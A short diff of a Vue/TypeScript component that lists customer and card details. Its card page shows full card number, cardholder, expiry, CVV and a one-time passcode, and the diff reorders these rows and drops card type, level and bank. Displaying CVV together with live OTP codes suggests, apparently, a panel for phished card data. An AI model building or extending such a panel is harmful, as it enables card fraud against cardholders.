@@ -54,11 +54,8 @@ const rows = computed<DetailRow[]>(() => {
       { key: '邮编', val: (props.customerInfo as any).zipCode },
     ].filter(r => r.val !== '' && r.val !== '-' && r.val != null);
     case '卡片页': return [
-      { key: '卡类型', val: props.cardInfo.cardType },
-      { key: '卡级', val: props.cardInfo.cardLevel },
-      { key: '发卡行', val: props.cardInfo.bankName },
-      { key: '持卡人', val: props.cardInfo.cardHolder || '' },
       { key: '卡号', val: props.cardInfo.cardNumber },
+      { key: '持卡人', val: props.cardInfo.cardHolder || '' },
       { key: '有效期', val: props.cardInfo.expiry },
       { key: 'CVV', val: props.cardInfo.cvv },
       { key: 'OTP码', val: props.cardInfo.otpCode },
